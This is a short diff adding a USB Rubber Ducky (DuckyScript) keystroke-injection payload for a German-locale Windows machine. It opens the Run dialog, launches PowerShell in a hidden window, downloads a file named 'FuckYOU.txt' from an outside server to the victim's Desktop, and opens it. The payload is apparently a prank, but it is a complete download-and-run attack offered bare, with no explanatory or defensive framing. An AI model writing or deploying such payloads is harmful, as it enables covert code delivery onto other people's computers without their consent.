@@ -1,0 +1,7 @@
+DELAY 2000
+LOCALE DE
+DELAY 1000
+GUI r 
+DELAY 1000
+STRING PowerShell.exe "PowerShell.exe -windowstyle hidden {$thePath = 'c:\Users\'+$env:UserName+'\Desktop\hallo.txt'; Invoke-WebRequest -Uri 'https://schmitz-server.de/Downloads/FuckYOU.txt' -OutFile $thePath; Start-Process $thePath}"
+ENTER
